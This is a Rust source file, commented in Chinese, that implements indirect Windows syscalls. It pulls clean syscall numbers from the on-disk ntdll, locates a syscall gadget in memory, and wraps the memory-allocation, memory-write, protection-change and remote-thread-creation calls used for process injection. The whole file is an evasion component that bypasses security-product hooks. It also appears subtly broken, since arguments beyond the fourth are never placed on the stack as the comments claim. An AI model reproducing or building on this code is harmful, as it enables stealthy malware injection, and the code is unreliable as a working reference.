use std::fs;
use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
use windows_sys::Win32::System::SystemInformation::GetSystemDirectoryA;

/// 從磁碟版 ntdll 取得乾淨的 syscall number
unsafe fn get_syscall_number(func_name: &str) -> Option<u32> {
    unsafe {
        // 讀磁碟版 ntdll
        let mut buf = [0u8; 260];
        let len = GetSystemDirectoryA(buf.as_mut_ptr(), 260);
        let sys_dir = String::from_utf8_lossy(&buf[..len as usize]).to_string();
        let ntdll_path = format!("{}\\ntdll.dll", sys_dir);
        let clean_ntdll = fs::read(&ntdll_path).ok()?;

        let pe = goblin::pe::PE::parse(&clean_ntdll).ok()?;

        // 找 export table 裡的目標函式
        for export in &pe.exports {
            if export.name == Some(func_name) {
                let offset = export.offset?;
                // Nt 函式開頭固定格式：
                // 4C 8B D1        mov r10, rcx
                // B8 XX 00 00 00  mov eax, <syscall_number>
                if offset + 8 > clean_ntdll.len() {
                    return None;
                }
                // byte[0] = 0x4C, byte[3] = 0xB8 → 取 byte[4..8] 為 syscall number
                if clean_ntdll[offset] == 0x4C
                    && clean_ntdll[offset + 1] == 0x8B
                    && clean_ntdll[offset + 2] == 0xD1
                    && clean_ntdll[offset + 3] == 0xB8
                {
                    let num =
                        u32::from_le_bytes(clean_ntdll[offset + 4..offset + 8].try_into().unwrap());
                    return Some(num);
                }
            }
        }
        None
    }
}

/// 從記憶體中的 ntdll 找到 syscall; ret gadget 的位址
/// 用作間接呼叫的跳板，讓 kernel 看到的 return address 在 ntdll 內
unsafe fn find_syscall_gadget() -> Option<usize> {
    unsafe {
        let ntdll_base = GetModuleHandleA(c"ntdll.dll".as_ptr().cast()) as *const u8;
        if ntdll_base.is_null() {
            return None;
        }

        let pe_slice = std::slice::from_raw_parts(ntdll_base, 0x200000);
        let clean_pe = goblin::pe::PE::parse(pe_slice).ok()?;

        let text_section = clean_pe
            .sections
            .iter()
            .find(|s| String::from_utf8_lossy(&s.name).starts_with(".text"))?;

        let text_start = text_section.virtual_address as usize;
        let text_size = text_section.virtual_size as usize;

        // 搜尋 0F 05 C3 (syscall; ret)
        for i in text_start..text_start + text_size - 2 {
            let ptr = ntdll_base.add(i);
            if *ptr == 0x0F && *ptr.add(1) == 0x05 && *ptr.add(2) == 0xC3 {
                return Some(ptr as usize);
            }
        }
        None
    }
}

/// 預先解析好的 syscall 資訊，避免每次呼叫都重新解析
pub struct SyscallTable {
    pub nt_allocate_virtual_memory: u32,
    pub nt_write_virtual_memory: u32,
    pub nt_protect_virtual_memory: u32,
    pub nt_create_thread_ex: u32,
    pub syscall_gadget: usize,
}

impl SyscallTable {
    pub unsafe fn init() -> Option<Self> {
        unsafe {
            let gadget = find_syscall_gadget()?;
            log::debug!("[Syscall] syscall gadget at 0x{:x}", gadget);

            let table = SyscallTable {
                nt_allocate_virtual_memory: get_syscall_number("NtAllocateVirtualMemory")?,
                nt_write_virtual_memory: get_syscall_number("NtWriteVirtualMemory")?,
                nt_protect_virtual_memory: get_syscall_number("NtProtectVirtualMemory")?,
                nt_create_thread_ex: get_syscall_number("NtCreateThreadEx")?,
                syscall_gadget: gadget,
            };

            log::debug!(
                "[Syscall] NtAllocateVirtualMemory = 0x{:x}",
                table.nt_allocate_virtual_memory
            );
            log::debug!(
                "[Syscall] NtWriteVirtualMemory    = 0x{:x}",
                table.nt_write_virtual_memory
            );
            log::debug!(
                "[Syscall] NtProtectVirtualMemory  = 0x{:x}",
                table.nt_protect_virtual_memory
            );
            log::debug!(
                "[Syscall] NtCreateThreadEx        = 0x{:x}",
                table.nt_create_thread_ex
            );

            Some(table)
        }
    }
}

/// 間接 syscall 核心：設定 syscall number 和 gadget 位址後執行
/// 用 inline asm 模擬 ntdll 的 Nt 函式，但跳板指向 ntdll 內的 syscall gadget
#[inline(always)]
pub unsafe fn indirect_syscall(syscall_number: u32, gadget: usize, args: &[u64]) -> i32 {
    unsafe {
        let result: i32;
        // Windows x64 calling convention:
        // 前 4 個參數 → rcx, rdx, r8, r9
        // 第 5 個以上 → stack（呼叫前已由 Rust 放好）
        // syscall number → eax
        // gadget 位址 → r11（間接呼叫用）
        let a0 = if !args.is_empty() { args[0] } else { 0 };
        let a1 = if args.len() > 1 { args[1] } else { 0 };
        let a2 = if args.len() > 2 { args[2] } else { 0 };
        let a3 = if args.len() > 3 { args[3] } else { 0 };

        std::arch::asm!(
            // mov r10, rcx（ntdll Nt 函式的固定開頭）
            "mov r10, rcx",
            // syscall number
            "mov eax, {syscall_num:e}",
            // 間接跳到 ntdll 的 syscall gadget
            "call {gadget}",
            syscall_num = in(reg) syscall_number,
            gadget = in(reg) gadget,
            in("rcx") a0,
            in("rdx") a1,
            in("r8")  a2,
            in("r9")  a3,
            out("rax") result,
            options(nostack),
        );
        result
    }
}

pub unsafe fn nt_allocate_virtual_memory(
    table: &SyscallTable,
    process_handle: isize,
    base_address: *mut *mut std::ffi::c_void,
    zero_bits: u64,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> i32 {
    unsafe {
        indirect_syscall(
            table.nt_allocate_virtual_memory,
            table.syscall_gadget,
            &[
                process_handle as u64,
                base_address as u64,
                zero_bits,
                region_size as u64,
                allocation_type as u64,
                protect as u64,
            ],
        )
    }
}

pub unsafe fn nt_write_virtual_memory(
    table: &SyscallTable,
    process_handle: isize,
    base_address: *mut std::ffi::c_void,
    buffer: *const std::ffi::c_void,
    number_of_bytes: usize,
    bytes_written: *mut usize,
) -> i32 {
    unsafe {
        indirect_syscall(
            table.nt_write_virtual_memory,
            table.syscall_gadget,
            &[
                process_handle as u64,
                base_address as u64,
                buffer as u64,
                number_of_bytes as u64,
                bytes_written as u64,
            ],
        )
    }
}

pub unsafe fn nt_protect_virtual_memory(
    table: &SyscallTable,
    process_handle: isize,
    base_address: *mut *mut std::ffi::c_void,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> i32 {
    unsafe {
        indirect_syscall(
            table.nt_protect_virtual_memory,
            table.syscall_gadget,
            &[
                process_handle as u64,
                base_address as u64,
                region_size as u64,
                new_protect as u64,
                old_protect as u64,
            ],
        )
    }
}

pub struct NtCreateThreadExParams {
    pub desired_access: u32,
    pub object_attributes: usize,
    pub start_routine: usize,
    pub argument: usize,
    pub create_flags: u32,
    pub zero_bits: usize,
    pub stack_size: usize,
    pub maximum_stack_size: usize,
    pub attribute_list: usize,
}

pub unsafe fn nt_create_thread_ex(
    table: &SyscallTable,
    thread_handle: *mut isize,
    process_handle: isize,
    params: &NtCreateThreadExParams,
) -> i32 {
    unsafe {
        indirect_syscall(
            table.nt_create_thread_ex,
            table.syscall_gadget,
            &[
                thread_handle as u64,
                params.desired_access as u64,
                params.object_attributes as u64,
                process_handle as u64,
                params.start_routine as u64,
                params.argument as u64,
                params.create_flags as u64,
                params.zero_bits as u64,
                params.stack_size as u64,
                params.maximum_stack_size as u64,
                params.attribute_list as u64,
            ],
        )
    }
}
